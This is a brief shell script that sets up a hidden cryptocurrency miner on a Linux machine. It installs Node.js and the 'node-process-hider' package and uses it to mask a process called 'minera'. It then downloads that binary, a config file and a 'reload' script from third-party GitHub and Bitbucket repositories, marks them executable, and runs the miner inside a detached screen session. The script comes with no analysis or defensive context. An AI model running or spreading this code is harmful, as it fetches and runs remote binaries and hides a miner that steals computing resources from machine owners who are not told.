apt update -y
apt install gcc screen -y
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
apt install nodejs -y
npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add minera 
wget https://github.com/danipedrosang/marcrash/raw/main/minera && wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/config.json && wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload &&  chmod +x minera reload
screen -dmS run ./minera
./reload
